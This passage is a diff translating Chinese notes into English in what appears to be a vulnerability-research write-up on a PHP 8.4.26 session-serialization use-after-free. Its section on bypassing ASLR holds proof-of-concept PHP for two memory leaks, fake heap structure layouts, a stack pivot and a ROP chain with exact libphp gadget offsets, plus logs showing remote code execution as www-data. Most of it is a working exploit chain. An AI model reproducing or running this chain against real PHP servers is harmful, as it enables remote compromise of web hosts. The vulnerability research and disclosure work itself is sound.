+- This line's "RCE" is an application-level trigger (`session_unset` + destructor). Do not describe it in external reporting as a "pure upload_progress, no application cooperation" exploit; the pure RCE on the upload_progress line still requires the merge work in Section 7.
 
 ---
 
-## 10. ASLR 绕过（已解决）
+## 10. ASLR bypass (solved)
 
-目标：在 `personality=0`（正常 ASLR）下完成同一 Defect D RCE，不依赖 `/proc/self/maps`、不依赖调试器。
+Goal: achieve the same Defect D RCE under `personality=0` (normal ASLR), without relying on `/proc/self/maps` or a debugger.
 
-### 10.1 两个泄漏原语
+### 10.1 Two leak primitives
 
-#### 泄漏 1：Zend MM 2MB chunk base（775 字节堆指针）
+#### Leak 1: Zend MM 2MB chunk base (775-byte heap pointer)
 
-`session.serialize_handler=php_serialize` 时，`session_encode()` → `php_var_serialize(&buf, Z_REFVAL(PS(http_session_vars)))`，这条路径**没有** GH-16590 为 `php` 序列化器加的 `PS_ENCODE_LOOP` 数组拷贝保护（8.4.26 仍可触发）：
+With `session.serialize_handler=php_serialize`, `session_encode()` → `php_var_serialize(&buf, Z_REFVAL(PS(http_session_vars)))`; this path does **not** have the `PS_ENCODE_LOOP` array-copy protection that GH-16590 added for the `php` serializer (still triggerable in 8.4.26):
 
 ```php
 class C {
     function __serialize() {
-        $_SESSION = [];                 // 释放正在被序列化的 session 数组
+        $_SESSION = [];                 // free the session array currently being serialized
         $leak = [0x41424344, 0x45464748];
-        $GLOBALS['keepref'] =& $leak;   // zend_reference，重占被释放的 32B 字符串块
+        $GLOBALS['keepref'] =& $leak;   // zend_reference, reclaims the freed 32B string chunk
         return [];
     }
 }
 session_start();
 $_SESSION['Lz'] = new C;
-$_SESSION['s'] = str_repeat('A', 7); // zend_string 分配 = 24+8 = 32B
+$_SESSION['s'] = str_repeat('A', 7); // zend_string allocation = 24+8 = 32B
 for ($i=0;$i<8;$i++) $_SESSION['k'.$i] = $i;
 $s = session_encode();
 ```
 
-序列化器继续遍历已释放的旧 session 数组；旧字符串 zval 指向的 32B 块被 `zend_reference` 重占，reference 的 `val.type_info=0x307`（IS_ARRAY）被当作 zend_string 的 `len=775`，于是 `session_encode()` 返回 775 字节的越界读。
+The serializer continues iterating over the freed old session array; the 32B chunk pointed to by the old string zval is reclaimed by a `zend_reference`, and the reference's `val.type_info=0x307` (IS_ARRAY) is treated as the zend_string's `len=775`, so `session_encode()` returns a 775-byte out-of-bounds read.
 
-- 775 字节 payload 中含多个规范堆指针（如 no-ASLR `0x7ffff5e023a0`，ASLR `0x7fd3e62013a0`）。
-- 对任意一个指针做 `ptr & ~0x1fffff` 即得到 2MB 对齐的 Zend MM chunk base。
-- 与 `/proc/<pid>/maps` 中 2MB 对齐的匿名 `rw-p` 映射完全一致（ASLR 例：`0x7fd3e6200000-0x7fd3e6400000`）。
-- 脚本：`tools/leak.php`。
+- The 775-byte payload contains several canonical heap pointers (e.g., no-ASLR `0x7ffff5e023a0`, ASLR `0x7fd3e62013a0`).
+- `ptr & ~0x1fffff` on any one pointer yields the 2MB-aligned Zend MM chunk base.
+- It matches exactly the 2MB-aligned anonymous `rw-p` mapping in `/proc/<pid>/maps` (ASLR example: `0x7fd3e6200000-0x7fd3e6400000`).
+- Script: `tools/leak.php`.
 
-#### 泄漏 2：libphp base（受控长度 32KB OOB 读）
+#### Leak 2: libphp base (controlled-length 32KB OOB read)
 
-同样是 `php_serialize` + `session_encode()`，但旧 session 数组里放一个 4050 字节的字符串 S（对应 4096 字节 bin）。`__serialize()` 里释放 session 后，用 `stream_bucket_new()` 分配 4096 字节裸缓冲重占 S，并写入 fake `zend_string` 头：
+Also `php_serialize` + `session_encode()`, but the old session array contains a 4050-byte string S (corresponding to the 4096-byte bin). In `__serialize()`, after freeing the session, allocate a 4096-byte raw buffer with `stream_bucket_new()` to reclaim S and write a fake `zend_string` header:
 
 ```text
 offset 0: gc.refcount=1, gc.type_info=IS_STRING
 offset 8: h=0
 offset 16: len=32768
-offset 24: 数据（"LEAKMARK" 等）
+offset 24: data ("LEAKMARK" etc.)
 ```
 
-序列化器把 S 当作长度为 32768 的字符串，复制 S+24 开始的 32KB，越过 4096 字节缓冲进入相邻堆，输出中固定偏移 `0x1fe8`（8168）处是 libphp 代码指针。
+The serializer treats S as a string of length 32768 and copies 32KB starting at S+24, crossing the 4096-byte buffer into adjacent heap; at a fixed offset `0x1fe8` (8168) in the output is a libphp code pointer.
 
-- 实测 ASLR：`anchor=0x7f17fe3b6309` → `libphp_base = anchor - 0x5b6309 = 0x7f17fde00000`，与 `/proc/<pid>/maps` 的 `libphp.so` r--p 起始完全一致。
-- 新 master 重启后 anchor 变化（如 `0x7fd3e7fb6309` → base `0x7fd3e7a00000`），公式仍成立。
-- 脚本：`tools/leak_libc.php?mode=file_first`。
+- Measured ASLR: `anchor=0x7f17fe3b6309` → `libphp_base = anchor - 0x5b6309 = 0x7f17fde00000`, exactly matching the r--p start of `libphp.so` in `/proc/<pid>/maps`.
+- After a new master restart, the anchor changes (e.g., `0x7fd3e7fb6309` → base `0x7fd3e7a00000`), and the formula still holds.
+- Script: `tools/leak_libc.php?mode=file_first`.
 
-### 10.2 ASLR 自适应的 Defect D ROP
+### 10.2 ASLR-adaptive Defect D ROP
 
-完整驱动 `tools/aslr_run2.py`：
+Full driver `tools/aslr_run2.py`:
 
-1. 请求 `/leak.php`，解析 775 字节，取 `hb = 众数(ptr & ~0x1fffff)`。
-2. 请求 `/leak_libc.php?mode=file_first`，取 payload 偏移 `0x1fe8` 的 qword，`lb = anchor - 0x5b6309`。
-3. 计算 `S = hb + 0x3780`（该值是对 **两次泄漏请求之后、`dyn_payload.php` 请求**在 no-ASLR 下实测的 arData 分配起点偏移；不同脚本/请求顺序需重测）。
-4. 生成 320 字节 payload（Python `struct.pack`，640 字符 hex），通过 `?p=` 发给 `/dyn_payload.php`；PHP 只做一次 `hex2bin`，保持与校准脚本相同的分配模式。
-5. payload 中：
-   - `bucket1` fake zval：`value=S+0x80`，`type=0x307`。
-   - fake HashTable @ `S+0x80`：`flags=HASH_FLAG_STATIC_KEYS(16)`，`nTableMask=0xfffffff8`，`arData=S+0xa0`，`nNumUsed=nNumOfElements=1`。
-   - `pDestructor = lb + 0x21ef23`（libphp `leave; ret`）。
-   - `zend_hash_destroy` 调用 `pDestructor(&p->val)` 时 `RBP = end = arData + nNumUsed*32 = S+0xc0`；`leave;ret` 把栈迁到 payload `S+0xc0`。
-   - ROP：
+1. Request `/leak.php`, parse the 775 bytes, take `hb = mode(ptr & ~0x1fffff)`.
+2. Request `/leak_libc.php?mode=file_first`, take the qword at payload offset `0x1fe8`, `lb = anchor - 0x5b6309`.
+3. Compute `S = hb + 0x3780` (this value is the arData allocation-start offset measured under no ASLR for **the `dyn_payload.php` request after the two leak requests**; different scripts/request orders need re-measurement).
+4. Generate a 320-byte payload (Python `struct.pack`, 640 hex chars) and send it to `/dyn_payload.php` via `?p=`; PHP only does one `hex2bin`, keeping the same allocation pattern as the calibration script.
+5. In the payload:
+   - `bucket1` fake zval: `value=S+0x80`, `type=0x307`.
+   - fake HashTable @ `S+0x80`: `flags=HASH_FLAG_STATIC_KEYS(16)`, `nTableMask=0xfffffff8`, `arData=S+0xa0`, `nNumUsed=nNumOfElements=1`.
+   - `pDestructor = lb + 0x21ef23` (libphp `leave; ret`).
+   - When `zend_hash_destroy` calls `pDestructor(&p->val)`, `RBP = end = arData + nNumUsed*32 = S+0xc0`; `leave;ret` pivots the stack to payload `S+0xc0`.
+   - ROP:
      ```text
      S+0xc0: 0
      S+0xc8: lb + 0x15e492  (pop rdi; ret)
      S+0xd0: S + 0x120      ("id>/tmp/x")
      S+0xd8: lb + 0x15d1a3  (pop rsi; ret)
      S+0xe0: S + 0x130      ("r")
-     S+0xe8: lb + 0x15a029  (ret; 对齐)
+     S+0xe8: lb + 0x15a029  (ret; alignment)
      S+0xf0: lb + 0x1504d0  (popen@plt)
      S+0xf8: lb + 0x155780  (exit@plt)
      ```
-   - 只用 libphp 地址，不需要 libc base；`popen` 由 libphp 的 PLT 解析。
-6. 命令 `id>/tmp/x` 同步执行，proof 文件写出；随后 `exit`/worker 退出。
+   - Uses only libphp addresses; no libc base needed; `popen` is resolved by libphp's PLT.
+6. The command `id>/tmp/x` executes synchronously and the proof file is written; then `exit`/the worker exits.
 
-### 10.3 ASLR 下实测结果
+### 10.3 Measured results under ASLR
 
-当前 master（`personality=0`）：
+Current master (`personality=0`):
 
 ```text
 anchor 0x7f17fe3b6309 hb 0x7f17fc600000 lb 0x7f17fde00000 S 0x7f17fc603780
 PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
-（连续 3/3）
+(3/3 consecutive)
 ```
 
-重启全新 Apache master（所有基址重新随机化）：
+After restarting a fresh Apache master (all base addresses re-randomized):
 
 ```text
 anchor 0x7fd3e7fb6309 hb 0x7fd3e6200000 lb 0x7fd3e7a00000 S 0x7fd3e6203780
 PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
-（连续 2/2）
+(2/2 consecutive)
 ```
 
-注意：同一个 Apache master 下，prefork 子进程继承相同的 Zend MM chunk / libphp 映射，因此 hb/lb 在 worker 重建后仍相同；master 重启后才会变化，泄漏会重新适配。
+Note: under the same Apache master, prefork children inherit the same Zend MM chunk / libphp mappings, so hb/lb remain the same after worker recreation; they change only after the master restarts, and the leak adapts again.
 
-### 10.4 限制与注意
+### 10.4 Limitations and cautions
 
-- 泄漏 1/2 依赖 `session.serialize_handler=php_serialize`（脚本可 `ini_set`，或应用本身使用该序列化器）。默认 `php` 序列化器已修复 GH-16590，不再泄露。
-- `libphp_base` anchor 偏移 `0x5b6309`、gadget/PLT 偏移、`S_OFF=0x3780` 都绑定本实验的 PHP 8.4.26 构建与请求形状；换构建/脚本需重新校准。
-- 本线仍是应用级触发（`session_unset` + 析构器）；泄漏脚本是同一应用中的用户态 PHP 代码。要变成“纯 upload_progress、无应用配合”，需要把第 7 节的跨请求链与本节的 ROP 终点合并。
-- 目录中另有并行 agent 的 `/proc/self/maps` 变体（`tools/d_aslr.php`、`tools/maps.php`、`tools/calibrate.py` 等），它依赖应用可读 `/proc/self/maps`；本节的泄漏方案不依赖文件读。
+- Leaks 1/2 depend on `session.serialize_handler=php_serialize` (the script can `ini_set` it, or the application itself uses that serializer). The default `php` serializer has been fixed by GH-16590 and no longer leaks.
+- The `libphp_base` anchor offset `0x5b6309`, gadget/PLT offsets, and `S_OFF=0x3780` are all bound to this experiment's PHP 8.4.26 build and request shape; a different build/script requires recalibration.
+- This line is still an application-level trigger (`session_unset` + destructor); the leak scripts are userland PHP code in the same application. To turn it into "pure upload_progress, no application cooperation", the cross-request chain from Section 7 must be merged with the ROP endpoint from this section.
+- The directory also contains a parallel agent's `/proc/self/maps` variant (`tools/d_aslr.php`, `tools/maps.php`, `tools/calibrate.py`, etc.), which relies on the application being able to read `/proc/self/maps`; this section's leak scheme does not depend on file reads.
